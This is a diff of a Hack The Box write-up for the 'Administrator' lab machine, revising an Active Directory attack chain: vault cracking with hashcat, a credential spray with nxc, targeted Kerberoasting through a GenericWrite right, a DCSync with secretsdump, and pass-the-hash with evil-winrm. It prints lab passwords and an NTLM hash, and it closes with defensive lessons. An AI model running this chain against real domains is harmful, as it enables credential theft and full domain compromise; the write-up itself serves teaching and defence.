@@ -2,9 +2,9 @@
 title: "Administrator — HackTheBox Writeup"
 date: 2026-04-28
 author: "Basil9099"
-tags: ["HTB","Windows","Active Directory","BloodHound","Kerberos","DCSync","Impacket","nxc","Privilege Escalation"]
+tags: ["HTB","Windows","Active Directory","BloodHound","Kerberos","DCSync","Impacket","nxc","hashcat","Kerberoasting","Privilege Escalation"]
 categories: ["CTF Writeups"]
-summary: "Provided creds → BloodHound ACL chain (Olivia → Michael → Benjamin) → FTP .psafe3 backup → Emily → Ethan DCSync → Administrator NTLM → SYSTEM via psexec.py."
+summary: "Olivia → BloodHound ACL chain (ForceChangePassword) → Benjamin → FTP .psafe3 → hashcat → password spray to Emily → targetedKerberoast on Ethan → DCSync Administrator."
 images: ["/images/administrator/administrator.png"]
 cover:
   image: "/images/administrator/administrator.png"
@@ -82,9 +82,7 @@ Pull the domain user list over LDAP for later targeting:
 nxc ldap 10.129.x.x -u olivia -p 'ichliebedich' --users
 ```
 
-Notable accounts: `olivia`, `michael`, `benjamin`, `emily`, `ethan`, `alexander`, `Administrator`, plus the usual built-ins.
-
-![nxc ldap dumping domain users](/images/administrator/nxc_ldap_users.png)
+Notable accounts: `olivia`, `michael`, `benjamin`, `emily`, `ethan`, `alexander`, `emma`, `Administrator`, plus the usual built-ins.
 
 ---
 
@@ -169,115 +167,134 @@ ftp> bye
 
 A single artifact drops out — `Backup.psafe3`, a [Password Safe v3](https://pwsafe.org/) encrypted vault.
 
-![FTP login as Benjamin and pulling the .psafe3 backup](/images/administrator/ftp_benjamin.png)
-
-![Backup.psafe3 download confirmation](/images/administrator/psafe_download.png)
-
 ---
 
 ## Cracking the Password Safe vault
 
-Convert the vault to a John-readable hash, then brute-force with rockyou:
+Hashcat speaks Password Safe v3 natively as mode `5200`, so there's no need for the `pwsafe2john` detour — point it straight at the vault file:
 
 ```bash
-pwsafe2john Backup.psafe3 > psafe.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
+hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
 ```
 
-![pwsafe2john extracting the hash](/images/administrator/pwsafe2john.png)
+![hashcat -m 5200 against Backup.psafe3](/images/administrator/hashcat.png)
 
-![John cracking the vault password](/images/administrator/john_crack.png)
+rockyou cracks it almost immediately — the master passphrase is `tekieromucho`.
 
-Open the vault with the cracked passphrase — the relevant entry inside is **Emily**'s domain credential. (Other vault entries redacted in the screenshot.)
+![hashcat cracking the vault: tekieromucho](/images/administrator/hashcat_cracked.png)
+
+Open the vault with the cracked passphrase:
 
 ```bash
 pwsafe Backup.psafe3
 ```
 
-![Password Safe vault open showing Emily's entry](/images/administrator/pwsafe_open.png)
+Three entries inside — **Alexander Smith**, **Emily Rodriguez**, **Emma Johnson**:
 
-Validate Emily's creds:
+![Password Safe vault open showing Alexander, Emily, Emma](/images/administrator/pwsafe_open.png)
+
+The vault gives three plaintext domain passwords (one per entry):
+
+![Plaintext credentials extracted from the vault](/images/administrator/creds.png)
+
+---
+
+## Password spraying the vault contents
+
+The vault hands you three passwords but not which login each one belongs to — Password Safe stores them by display name, and the actual `samAccountName` mapping isn't guaranteed. Instead of guessing, drop the three accounts into `users.txt` and the three passwords into `pass.txt` and let `nxc` spray them as a matrix:
 
 ```bash
-nxc smb 10.129.x.x -u emily -p '<emily-password>'
+nxc smb 10.129.x.x -u users.txt -p pass.txt
 ```
+
+Only one combination authenticates — `emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb`:
+
+![nxc password spray matching emily to her vault password](/images/administrator/password_spray.png)
+
+Drop straight into a WinRM shell with the matched cred:
+
+```bash
+evil-winrm -i 10.129.x.x -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+```
+
+![evil-winrm landing as emily](/images/administrator/evil_winrm_emily.png)
+
+The user flag lives under `C:\Users\Emily\Desktop\user.txt`.
 
 ---
 
 ## Privilege escalation: Emily → Ethan
 
-Re-running BloodHound with **Emily** marked as Owned shows the next edge:
+Re-running BloodHound with **Emily** marked as Owned exposes the next edge:
 
 ```text
-EMILY --[GenericWrite / WriteOwner]--> ETHAN
+EMILY --[GenericWrite]--> ETHAN
 ```
 
-Ethan is the interesting target because he holds **DCSync rights** (`GetChanges` + `GetChangesAll` on the domain object). Two routes work; I took Kerberoasting first because Ethan exposed an SPN:
+Ethan is the interesting target because he holds **DCSync rights** (`GetChanges` + `GetChangesAll` on the domain object). `GenericWrite` on a user lets us assign an arbitrary `servicePrincipalName` — which immediately makes Ethan Kerberoastable. That's the whole idea behind **targeted Kerberoasting**: the tool writes a throwaway SPN onto the target, requests a TGS, then cleans up.
+
+### Fix the clock first
+
+Kerberos refuses tickets with skew greater than 5 minutes. The nmap output flagged a ~7h offset against the DC, so sync the local clock before doing anything Kerberos-related:
 
 ```bash
-impacket-GetUserSPNs administrator.htb/emily:'<emily-password>' \
-  -dc-ip 10.129.x.x -request -outputfile ethan.spn
-john --wordlist=/usr/share/wordlists/rockyou.txt ethan.spn
+sudo ntpdate 10.129.x.x
 ```
 
-![GetUserSPNs / ACL path to Ethan](/images/administrator/kerberoast_or_acl_ethan.png)
+![ntpdate stepping the local clock to match the DC](/images/administrator/ntpdate.png)
+
+### targetedKerberoast
+
+```bash
+python3 targetedKerberoast.py -d administrator.htb -u emily \
+  -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+```
+
+The script writes an SPN onto Ethan, prints the resulting `$krb5tgs$23$...` hash, and removes the SPN — Ethan looks unchanged afterwards.
+
+![targetedKerberoast against ethan via emily's GenericWrite](/images/administrator/kerberoast.png)
+
+### Cracking Ethan's TGS
+
+Save the hash to `ethan.txt` and crack it as Kerberos 5 TGS-REP (`-m 13100`):
+
+```bash
+hashcat -a 0 -m 13100 ethan.txt /usr/share/wordlists/rockyou.txt
+```
+
+![hashcat cracking Ethan's TGS](/images/administrator/hashcat_ethan.png)
+
+Plaintext: `limpbizkit`.
 
 ---
 
 ## DCSync as Ethan
 
-Once you hold Ethan's password (or NT hash), the domain is effectively owned. Replicate the `Administrator` secret directly off the DC:
+Ethan's ACL gives him `GetChanges` + `GetChangesAll` on the domain object — game over. Pull the Administrator secret directly off the DC:
 
 ```bash
-impacket-secretsdump administrator.htb/ethan:'<ethan-password>'@10.129.x.x -just-dc-user Administrator
+impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.129.x.x
 ```
+
+The first `RemoteOperations` call falls back from the service-control path (`access_denied`) to the **DRSUAPI** replication method, which is the actual DCSync — and out comes the `Administrator` NTLM:
 
 ```text
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM>:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3ec553c4b9fd20bd016e098d2d2fd2e:::
 ```
 
-(All other principals omitted from the screenshot.)
-
-![secretsdump returning the Administrator NTLM hash](/images/administrator/secretsdump_dcsync.png)
+![secretsdump using DRSUAPI to dump the Administrator NTLM](/images/administrator/secretsdump.png)
 
 ---
 
-## SYSTEM shell & root flag
+## SYSTEM via pass-the-hash
 
-Pass-the-hash into a SYSTEM shell with `psexec.py`:
+Re-use evil-winrm with the NTLM hash to land directly as `Administrator`:
 
 ```bash
-impacket-psexec administrator.htb/Administrator@10.129.x.x -hashes :<NTLM>
+evil-winrm -i 10.129.x.x -u Administrator -H 3ec553c4b9fd20bd016e098d2d2fd2e
 ```
 
-```interactive shell
-C:\Windows\system32> whoami
-nt authority\system
-```
-
-![psexec.py landing as nt authority\system](/images/administrator/psexec_system.png)
-
-**Root flag:**
-
-```interactive shell
-C:\Users\Administrator\Desktop> type root.txt
-```
-
-"<root-flag-here>"
-
-![Root flag](/images/administrator/root_flag.png)
-
----
-
-## User flag
-
-```interactive shell
-C:\Users\Olivia\Desktop> type user.txt
-```
-
-"<user-flag-here>"
-
-![User flag](/images/administrator/user_flag.png)
+`root.txt` lives at `C:\Users\Administrator\Desktop\root.txt`.
 
 ---
 
@@ -286,15 +303,19 @@ C:\Users\Olivia\Desktop> type user.txt
 - **BloodHound is the map.** The `Olivia → Michael → Benjamin` chain is invisible from raw `net user` output — only an ACL graph surfaces it.
 - **`ForceChangePassword` is a sleeper privilege.** It looks innocuous in raw ACL output but is a complete account takeover primitive. Audit who can reset whom in your own AD.
 - **Backups leak credentials.** A Password Safe file on FTP is the canonical example — backup pipelines need the same scrutiny as production secrets stores.
+- **`GenericWrite` on a user = Kerberoasting.** You don't need an existing SPN; you can write one yourself, roast, then clean up. `targetedKerberoast` automates the whole dance.
+- **Watch the clock.** A 7-hour offset against the DC silently breaks every Kerberos request — `ntpdate` before you roast.
 - **DCSync is the AD endgame.** Any principal with `GetChanges` + `GetChangesAll` on the domain object can replicate `krbtgt` and `Administrator` — treat those rights as Tier-0.
-- **Chain, don't tunnel.** Each hop here was small (one ACL edge, one cracked file). The compromise emerges from chaining them, which is exactly how real AD breaches look.
+- **Chain, don't tunnel.** Each hop here was small (one ACL edge, one cracked file, one writable attribute). The compromise emerges from chaining them, which is exactly how real AD breaches look.
 
 ---
 
 ## Resources
 
 - [BloodHound CE — SpecterOps](https://bloodhound.specterops.io/)
-- [Impacket](https://github.com/fortra/impacket) — `GetUserSPNs.py`, `secretsdump.py`, `psexec.py`
-- [Password Safe](https://pwsafe.org/) and `pwsafe2john` (John the Ripper jumbo)
+- [Impacket](https://github.com/fortra/impacket) — `secretsdump.py`, `psexec.py`
+- [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) — abuse `GenericWrite` to make a user roastable
+- [hashcat](https://hashcat.net/hashcat/) — modes `5200` (Password Safe v3) and `13100` (Kerberos 5 TGS-REP)
+- [Password Safe](https://pwsafe.org/)
 - [MITRE ATT&CK T1003.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/)
 - Hack The Box — retired machines archive
